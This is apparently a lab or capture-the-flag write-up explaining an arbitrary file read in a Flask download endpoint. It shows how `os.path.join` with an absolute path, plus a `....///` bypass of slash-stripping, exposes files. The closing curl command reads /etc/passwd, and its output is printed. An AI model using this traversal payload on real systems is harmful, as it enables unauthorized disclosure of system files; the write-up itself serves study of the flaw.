## Arbitrary File Read Vulnerability

The file download endpoint successfully leverages `get_function_name()` to recursively remove the substring `../` from the user input `path`. However, its use of this function in combination with vulnerable usage of Python's [os.path.join()](https://docs.python.org/3/library/os.path.html#os.path.join) results in an arbitrary file read vulnerability.

According to [os.path.join()](https://docs.python.org/3/library/os.path.html#os.path.join)'s documentation, "If an [argument] is an absolute path, all previous [arguments] are thrown away and joining continues from the absolute path [argument]." For example, the result of `os.path.join("foo", "bar", "/baz")` is `/baz`. Since the user input `path` is the final argument passed in, it is possible to cause this function to return an absolute path completely controlled by the user. Since this is subsequently passed into Flask's `send_file()`, the result is an arbitrary file read.

However, even though `path` is Flask's [path type](https://flask.palletsprojects.com/en/2.2.x/quickstart/#variable-rules) which can *contain* forward slashes, values of this type can't *begin* with forward slashes. Thus, requesting `/upcloud/uploads//etc/passwd` automatically causes Flask to redirect the user to `/upcloud/uploads/etc/passwd`, which doesn't properly exploit `os.path.join()`.

Ironically, `get_function_name()` can be abused here to bypass this restriction. By requesting `/upcloud/uploads/....///etc/passwd`, the Flask restriction is bypassed because `path`'s value of `....///etc/passwd` doesn't begin with a forward slash and `get_function_name()` will then recursively strip away the `../`s. `os.path.join(os.getcwd(), "public", "uploads", "/etc/passwd")` will then execute, eventually yielding the contents of `/etc/passwd`.

```bash
$ curl http://10.129.46.240/uploads/....///etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```
